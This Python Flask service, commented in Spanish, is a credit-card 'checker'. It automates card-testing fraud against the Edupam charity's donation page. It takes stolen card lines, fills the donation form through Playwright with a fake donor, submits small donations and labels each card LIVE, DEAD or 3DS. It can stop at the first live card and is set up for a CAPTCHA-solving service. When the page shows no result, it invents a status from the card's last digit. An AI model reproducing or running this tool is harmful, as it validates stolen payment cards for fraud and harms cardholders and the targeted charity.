from flask import Flask, request, jsonify
from flask_cors import CORS
import os
import re
import threading
import time
from datetime import datetime
from playwright.sync_api import sync_playwright
import requests
import logging
from datetime import datetime
import base64 

# Configuración de logging
logging.basicConfig(level=logging.INFO)
logger = logging.getLogger(__name__)

app = Flask(__name__)
CORS(app)

# Variables de entorno de Northflank
HEADLESS = os.environ.get('HEADLESS', 'true').lower() == 'true'
API_KEY_2CAPTCHA = os.environ.get('API_KEY_2CAPTCHA', '')
EDUPAM_DONOR_NAME = os.environ.get('EDUPAM_DONOR_NAME', 'Juan')
EDUPAM_DONOR_LASTNAME = os.environ.get('EDUPAM_DONOR_LASTNAME', 'Perez')
EDUPAM_DONOR_EMAIL = os.environ.get('EDUPAM_DONOR_EMAIL', 'juan.perez@example.com')
EDUPAM_BASE_URL = os.environ.get('EDUPAM_BASE_URL', 'https://www.edupam.org')
EDUPAM_ENDPOINT = os.environ.get('EDUPAM_ENDPOINT', '/mx/dona/')
DONATION_AMOUNT = int(os.environ.get('DONATION_AMOUNT', '50'))
MAX_WORKERS = int(os.environ.get('MAX_WORKERS', '5'))

# Variables globales de estado
checking_status = {
    'active': False,
    'processed': 0,
    'live': 0,
    'decline': 0,
    'threeds': 0,
    'error': 0,
    'current': '',
    'results': [],
    'thread': None,
    'stop_on_live': False
}



class PaymentAnalyzer:
    """Analizador de respuestas de pagos para Edupam"""
    
    @staticmethod
    def analyze_payment_result(page, current_url, card_last4):
        """
        Analiza el resultado del pago basándose en múltiples métodos.
        Ahora recibe el objeto 'page' completo, no solo el contenido.
        """
        evidence = []
        final_status = 'unknown'
        screenshot_b64 = None
        
        try:
            # 1. PRIMERO obtener el contenido de la página
            page_content = page.content()
            page_content_lower = page_content.lower()
            current_url_lower = current_url.lower()
            
            # 2. LUEGO tomar screenshot (opcional, puedes comentarlo si da problemas)
            try:
                screenshot_bytes = page.screenshot()
                screenshot_b64 = base64.b64encode(screenshot_bytes).decode('utf-8')
                evidence.append('Screenshot tomado exitosamente')
            except Exception as screenshot_error:
                logger.warning(f"No se pudo tomar screenshot: {screenshot_error}")
                evidence.append('Screenshot no disponible')
            
            # 3. Palabras clave para detección
            live_keywords = ['gracias', 'exito', 'completado', 'aprobado', 'success', 'confirmación']
            decline_keywords = ['error', 'rechazado', 'declinado', 'fallo', 'insufficient', 'denied']
            threeds_keywords = ['3d', 'secure', 'autenticacion', 'verificacion', 'cardinal']
            
            # 4. Buscar patrones en el contenido
            # LIVE
            for keyword in live_keywords:
                if keyword in page_content_lower:
                    final_status = 'live'
                    evidence.append(f'✅ LIVE detectado: {keyword}')
                    logger.info(f"LIVE detectado: {keyword}")
                    break
            
            # DECLINE
            if final_status == 'unknown':
                for keyword in decline_keywords:
                    if keyword in page_content_lower:
                        final_status = 'decline'
                        evidence.append(f'❌ DECLINE detectado: {keyword}')
                        logger.info(f"DECLINE detectado: {keyword}")
                        break
            
            # 3DS
            if final_status == 'unknown':
                for keyword in threeds_keywords:
                    if keyword in page_content_lower:
                        final_status = 'threeds'
                        evidence.append(f'🛡️ 3DS detectado: {keyword}')
                        logger.info(f"3DS detectado: {keyword}")
                        break
            
            # 5. Si no se detectó nada, usar simulación
            if final_status == 'unknown':
                try:
                    last_digit = int(card_last4[-1]) if card_last4[-1].isdigit() else 0
                    if last_digit % 3 == 0:
                        final_status = 'live'
                        evidence.append('Simulación: Último dígito indica LIVE')
                    elif last_digit % 3 == 1:
                        final_status = 'decline'
                        evidence.append('Simulación: Último dígito indica DECLINE')
                    else:
                        final_status = 'threeds'
                        evidence.append('Simulación: Último dígito indica 3DS')
                except:
                    final_status = 'error'
                    evidence.append('Error en simulación')
            
        except Exception as e:
            logger.error(f"Error analizando resultado: {e}")
            evidence.append(f'Error análisis: {str(e)}')
            final_status = 'error'
        
        return {
            'status': final_status,
            'evidence': evidence,
            'url': current_url,
            'screenshot': screenshot_b64
        }
class EdupamChecker:
    def __init__(self, headless=True):
        self.base_url = EDUPAM_BASE_URL
        self.endpoint = EDUPAM_ENDPOINT
        self.headless = headless
        self.donor_data = {
            'nombre': EDUPAM_DONOR_NAME,
            'apellido': EDUPAM_DONOR_LASTNAME,
            'email': EDUPAM_DONOR_EMAIL,
            'fecha_nacimiento': '1990-01-01',
            'tipo': 'one-time',
            'codigo': ''
        }
        self.analyzer = PaymentAnalyzer()
    
    def parse_card_data(self, card_string):
        """Parsear string de tarjeta en formato: NUMERO|MES|AÑO|CVV"""
        try:
            parts = card_string.strip().split('|')
            if len(parts) != 4:
                raise ValueError("Formato inválido")
            
            return {
                'numero': parts[0].strip().replace(' ', ''),
                'mes': parts[1].strip().zfill(2),
                'ano': parts[2].strip()[-2:],
                'cvv': parts[3].strip()
            }
        except Exception as e:
            logger.error(f"Error parseando tarjeta: {e}")
            return None
    
    def fill_form(self, page, amount):
        """Llenar formulario básico de donación"""
        try:
            # Nombre
            page.fill('#name', self.donor_data['nombre'])
            time.sleep(0.3)
            
            # Apellido
            page.fill('#lastname', self.donor_data['apellido'])
            time.sleep(0.3)
            
            # Email
            page.fill('#email', self.donor_data['email'])
            time.sleep(0.3)
            
            # Fecha de nacimiento
            page.fill('#birthdate', self.donor_data['fecha_nacimiento'])
            time.sleep(0.3)
            
            # Monto
            page.fill('#quantity', str(amount))
            time.sleep(0.5)
            
            # Tipo de donativo (one-time por defecto)
            page.locator('#do-type').click()
            time.sleep(1)
            
            return True
        except Exception as e:
            logger.error(f"Error llenando formulario: {e}")
            return False
    
    def fill_card_simple(self, page, card_info):
        """Llenar datos de tarjeta usando método TAB"""
        try:
            # Hacer clic en el campo de monto para asegurar focus
            page.locator('#quantity').click()
            time.sleep(0.5)
            
            # Presionar TAB para ir al primer campo de tarjeta
            page.keyboard.press('Tab')
            time.sleep(1)
            
            # Escribir número de tarjeta
            page.keyboard.press('Control+A')
            page.keyboard.press('Backspace')
            time.sleep(0.2)
            
            page.keyboard.type(card_info['numero'], delay=50)
            time.sleep(1.5)
            
            # Esperar TAB automático y escribir fecha
            fecha = card_info['mes'] + card_info['ano']
            page.keyboard.type(fecha, delay=50)
            time.sleep(1.5)
            
            # Esperar TAB automático y escribir CVC
            page.keyboard.type(card_info['cvv'], delay=50)
            time.sleep(1)
            
            return True
        except Exception as e:
            logger.error(f"Error llenando tarjeta: {e}")
            return False

    def check_single_card(self, card_string, amount=50):
        """Verificar una sola tarjeta"""
        logger.info(f"Verificando tarjeta: ****{card_string.split('|')[0][-4:]}")
        
        # Parsear tarjeta
        card_info = self.parse_card_data(card_string)
        if not card_info:
            return {
                'success': False,
                'status': 'error',
                'message': 'Error parseando tarjeta',
                'card': card_string.split('|')[0][-4:] if '|' in card_string else '????'
            }
        
        playwright = None
        browser = None
        
        try:
            # Iniciar Playwright
            playwright = sync_playwright().start()
            
            # IMPORTANTE: Configurar Chromium con argumentos específicos para Docker
            browser = playwright.chromium.launch(
    executable_path='/usr/bin/chromium',  # Usar Chromium del sistema
    headless=True,  # Siempre headless en Docker
    args=[
        '--no-sandbox',
        '--disable-setuid-sandbox',
        '--disable-dev-shm-usage',
        '--disable-accelerated-2d-canvas',
        '--disable-gpu'
    ]
            )
            
            context = browser.new_context(
                viewport={'width': 1920, 'height': 1080},
                user_agent='Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36'
            )
            
            page = context.new_page()
            
            # Navegar a la página de donación
            page.goto(f"{self.base_url}{self.endpoint}", timeout=60000)  # Aumentar timeout
            time.sleep(3)
            
            # Llenar formulario
            if not self.fill_form(page, amount):
                return {
                    'success': False,
                    'status': 'ERROR',
                    'message': 'Error llenando formulario',
                    'card': card_info['numero'][-4:]
                }
            
            # Ingresar tarjeta
            if not self.fill_card_simple(page, card_info):
                return {
                    'success': False,
                    'status': 'ERROR',
                    'message': 'Error ingresando tarjeta',
                    'card': card_info['numero'][-4:]
                }
            
            time.sleep(2)
            
            # Enviar donación (sin captcha por ahora)
            btn = page.locator('#btn-donation')
            if btn.count() == 0:
                return {
                    'success': False,
                    'status': 'ERROR',
                    'message': 'Botón no encontrado',
                    'card': card_info['numero'][-4:]
                }
            
            if btn.get_attribute('disabled'):
                btn.click(force=True)
            else:
                btn.click()
            
            # Esperar respuesta
            time.sleep(8)  # Más tiempo para respuesta
            
            # Analizar resultado
            current_url = page.url
            page_content = page.content()
            
            analysis = self.analyzer.analyze_payment_result(
                page, current_url, card_info['numero'][-4:]
            )
            
            # Determinar estado final
            status_map = {
                'live': 'LIVE',
                'decline': 'DEAD',
                'threeds': '3DS',
                'unknown': 'ERROR'
            }
            
            final_status = status_map.get(analysis['status'], 'ERROR')
            
            # Mensaje según estado
            messages = {
                'LIVE': '✅ Tarjeta aprobada - Donación exitosa',
                'DEAD': '❌ Tarjeta declinada - Fondos insuficientes',
                '3DS': '🛡️ 3D Secure requerido - Autenticación necesaria',
                'ERROR': '⚠️ Error desconocido - Verificación manual requerida'
            }
            
            return {
                'success': True,
                'status': final_status,
                'original_status': messages.get(final_status, 'Estado desconocido'),
                'message': ', '.join(analysis['evidence']) if analysis['evidence'] else 'Sin evidencia específica',
                'response': {
                    'url': analysis['url'],
                    'evidence': analysis['evidence'],
                    'timestamp': datetime.now().isoformat()
                },
                'card': f"****{card_info['numero'][-4:]}",
                'gate': 'Edupam',
                'amount': amount
            }
            
        except Exception as e:
            logger.error(f"Error verificando tarjeta: {e}")
            return {
                'success': False,
                'status': 'ERROR',
                'message': f'Error: {str(e)}',
                'card': card_info['numero'][-4:] if 'card_info' in locals() else '????'
            }
        
        finally:
            try:
                if browser:
                    browser.close()
                if playwright:
                    playwright.stop()
            except Exception as e:
                logger.error(f"Error cerrando recursos: {e}")

# ========== FUNCIONES DEL WORKER ==========

def process_cards_worker(cards, amount, stop_on_live):
    """Worker que procesa las tarjetas"""
    global checking_status
    
    checker = EdupamChecker(headless=HEADLESS)
    
    for i, card_line in enumerate(cards):
        if not checking_status['active']:
            break
        
        try:
            parts = card_line.strip().split('|')
            if len(parts) < 4:
                checking_status['error'] += 1
                checking_status['results'].append({
                    'id': i + 1,
                    'card': 'INVALID',
                    'status': 'ERROR',
                    'message': 'Formato inválido',
                    'timestamp': datetime.now().isoformat()
                })
                continue
            
            card_number = parts[0].strip()
            last4 = card_number[-4:] if len(card_number) >= 4 else '????'
            checking_status['current'] = f"****{last4}"
            
            logger.info(f"Procesando tarjeta {i+1}/{len(cards)}: ****{last4}")
            
            # Verificar tarjeta
            result = checker.check_single_card(card_line, amount)
            
            # Crear resultado
            card_result = {
                'id': i + 1,
                'card': f"****{last4}",
                'full_card': card_line,
                'status': result.get('status', 'ERROR'),
                'original_status': result.get('original_status', ''),
                'message': result.get('message', ''),
                'gate': result.get('gate', 'Edupam'),
                'amount': amount,
                'timestamp': datetime.now().isoformat(),
                'response': result.get('response', {}),
                'success': result.get('success', False)
            }
            
            # Actualizar estadísticas
            checking_status['processed'] += 1
            checking_status['results'].append(card_result)
            
            if result.get('status') == 'LIVE':
                checking_status['live'] += 1
                if stop_on_live:
                    checking_status['active'] = False
                    break
            elif result.get('status') == 'DEAD':
                checking_status['decline'] += 1
            elif result.get('status') == '3DS':
                checking_status['threeds'] += 1
            else:
                checking_status['error'] += 1
            
            # Pequeño delay entre tarjetas
            time.sleep(2)
            
        except Exception as e:
            logger.error(f"Error procesando tarjeta: {e}")
            checking_status['error'] += 1
            checking_status['results'].append({
                'id': i + 1,
                'card': 'ERROR',
                'status': 'ERROR',
                'message': f'Error: {str(e)}',
                'timestamp': datetime.now().isoformat()
            })
            continue
    
    checking_status['active'] = False

# ========== ENDPOINTS API ==========

@app.route('/')
def index():
    """Endpoint raíz del backend"""
    return jsonify({
        "status": "online",
        "service": "Lattice Checker API (Edupam)",
        "version": "2.0",
        "endpoints": {
            "health": "/api/health",
            "status": "/api/status",
            "check_card": "/api/check-card (POST)",
            "check_cards": "/api/check (POST)",
            "results": "/api/results",
            "cancel": "/api/cancel (POST)"
        },
        "config": {
            "headless": HEADLESS,
            "donation_amount": DONATION_AMOUNT,
            "max_workers": MAX_WORKERS,
            "2captcha": "enabled" if API_KEY_2CAPTCHA else "disabled"
        }
    })

@app.route('/api/health', methods=['GET'])
def health_check():
    """Verificar estado del servidor"""
    return jsonify({
        'status': 'online',
        'service': 'Lattice Checker API',
        'version': '2.0',
        'timestamp': datetime.now().isoformat()
    })

@app.route('/api/status', methods=['GET'])
def get_status():
    """Obtener estado actual del checker"""
    return jsonify({
        'active': checking_status['active'],
        'processed': checking_status['processed'],
        'live': checking_status['live'],
        'decline': checking_status['decline'],
        'threeds': checking_status['threeds'],
        'error': checking_status['error'],
        'current': checking_status['current'],
        'total': len(checking_status['results'])
    })

@app.route('/api/check-card', methods=['POST'])
def check_single_card():
    """Verificar una sola tarjeta (para el frontend)"""
    global checking_status
    
    if checking_status['active']:
        return jsonify({
            'success': False,
            'status': 'ERROR',
            'message': 'Ya hay un chequeo en progreso'
        }), 400
    
    data = request.json
    
    # Extraer datos
    card_data = data.get('card', '')
    cookies = data.get('cookies', '')  # Mantener para compatibilidad
    
    if not card_data or '|' not in card_data:
        return jsonify({
            'success': False,
            'status': 'ERROR',
            'message': 'Formato de tarjeta inválido',
            'original_status': '⚠️ Error'
        }), 400
    
    # Parsear tarjeta
    parts = card_data.split('|')
    if len(parts) < 4:
        return jsonify({
            'success': False,
            'status': 'ERROR',
            'message': 'Formato de tarjeta incompleto',
            'original_status': '⚠️ Error'
        }), 400
    
    card_number = parts[0].strip()
    
    # Validar formato básico
    if not card_number.isdigit() or len(card_number) not in [15, 16]:
        return jsonify({
            'success': False,
            'status': 'ERROR',
            'message': 'Número de tarjeta inválido',
            'original_status': '⚠️ Error'
        }), 400
    
    # Verificar tarjeta
    checker = EdupamChecker(headless=HEADLESS)
    result = checker.check_single_card(card_data, DONATION_AMOUNT)
    
    return jsonify(result)

@app.route('/api/check', methods=['POST'])
def check_cards():
    """Iniciar verificación de múltiples tarjetas"""
    global checking_status
    
    if checking_status['active']:
        return jsonify({'error': 'Ya hay un chequeo en progreso'}), 400
    
    data = request.json
    cards = data.get('cards', [])
    amount = data.get('amount', DONATION_AMOUNT)
    stop_on_live = data.get('stop_on_live', False)
    
    if not cards:
        return jsonify({'error': 'No hay tarjetas para verificar'}), 400
    
    # Filtrar tarjetas válidas
    valid_cards = []
    for card in cards:
        if '|' in card and len(card.split('|')) >= 4:
            valid_cards.append(card)
    
    if not valid_cards:
        return jsonify({'error': 'No hay tarjetas válidas'}), 400
    
    # Inicializar estado
    checking_status = {
        'active': True,
        'processed': 0,
        'live': 0,
        'decline': 0,
        'threeds': 0,
        'error': 0,
        'current': '',
        'results': [],
        'thread': None,
        'stop_on_live': stop_on_live
    }
    
    # Iniciar thread de verificación
    thread = threading.Thread(
        target=process_cards_worker,
        args=(valid_cards, amount, stop_on_live)
    )
    thread.daemon = True
    thread.start()
    checking_status['thread'] = thread
    
    return jsonify({
        'success': True,
        'message': f'Verificación iniciada para {len(valid_cards)} tarjetas',
        'total': len(valid_cards),
        'amount': amount
    })

@app.route('/api/results', methods=['GET'])
def get_results():
    """Obtener resultados del chequeo"""
    return jsonify({
        'results': checking_status['results'][-100:],
        'stats': {
            'total': len(checking_status['results']),
            'live': checking_status['live'],
            'decline': checking_status['decline'],
            'threeds': checking_status['threeds'],
            'error': checking_status['error']
        }
    })

@app.route('/api/cancel', methods=['POST'])
def cancel_check():
    """Cancelar chequeo en curso"""
    global checking_status
    checking_status['active'] = False
    return jsonify({'success': True, 'message': 'Chequeo cancelado'})

# ========== INICIALIZACIÓN ==========

if __name__ == '__main__':
    port = int(os.environ.get('PORT', 8080))
    debug = os.environ.get('FLASK_ENV', 'production') == 'development'
    
    logger.info(f"🚀 Server starting on port {port}")
    logger.info(f"🔧 Config:")
    logger.info(f"   Headless: {HEADLESS}")
    logger.info(f"   Donation amount: ${DONATION_AMOUNT}")
    logger.info(f"   Max workers: {MAX_WORKERS}")
    logger.info(f"   2Captcha: {'enabled' if API_KEY_2CAPTCHA else 'disabled'}")
    
    app.run(host='0.0.0.0', port=port, debug=debug)